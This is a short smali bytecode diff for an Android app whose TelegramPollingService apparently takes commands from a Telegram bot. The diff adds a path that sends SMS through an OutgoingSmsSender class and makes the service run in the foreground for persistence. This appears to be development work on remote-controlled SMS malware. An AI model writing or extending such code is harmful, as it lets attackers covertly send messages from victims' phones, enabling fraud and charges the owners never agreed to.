@@ -1168,6 +1168,19 @@
     move-result-object v5
 
     .line 371
+    invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
+
+    move-result v6
+
+    if-eqz v6, :cond_out_send
+
+    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
+
+    monitor-exit p0
+
+    return-void
+
+    :cond_out_send
     invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z
 
     move-result v6
@@ -2787,7 +2800,7 @@
 
     const/16 v0, 0x3e7
 
-    invoke-virtual {p2, v0, p3}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V
+    invoke-virtual {p0, v0, p3}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
